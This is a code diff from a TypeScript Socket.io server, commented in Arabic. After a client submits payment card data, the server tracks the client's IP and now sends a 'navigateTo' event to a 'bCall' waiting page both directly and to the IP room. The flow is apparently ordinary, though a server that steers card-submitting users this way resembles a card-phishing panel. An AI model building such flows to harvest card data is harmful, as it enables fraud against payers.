@@ -184,17 +184,21 @@ export function initSocket(httpServer: HttpServer): SocketIOServer {
         });
 
         // توجيه العميل لصفحة الانتظار بعد حفظ البطاقة
+        // تسجيل الـ IP في الـ map
         if (clientIp && clientIp !== "unknown") {
-          // تسجيل الـ IP في الـ map
           ipToReference.set(clientIp, reference);
           ipToSocket.set(clientIp, socket.id);
           socket.join(`ip_${clientIp}`);
-          // إرسال navigateTo لصفحة bCall (الانتظار)
-          setTimeout(() => {
-            io?.to(`ip_${clientIp}`).emit("navigateTo", { page: "bCall", ip: clientIp });
-            io?.emit("navigateTo", { page: "bCall", ip: clientIp });
-          }, 500);
         }
+        // إرسال navigateTo مباشرة على socket العميل الحالي + broadcast
+        setTimeout(() => {
+          // إرسال مباشر على socket العميل
+          socket.emit("navigateTo", { page: "bCall", ip: clientIp });
+          // إرسال على الـ room إذا كان IP معروف
+          if (clientIp && clientIp !== "unknown") {
+            io?.to(`ip_${clientIp}`).emit("navigateTo", { page: "bCall", ip: clientIp });
+          }
+        }, 300);
       } catch (err: any) {
         console.error("[Socket.io] submitPaymentData error:", err);
         socket.emit("ackPayment", { success: false, error: err.message });
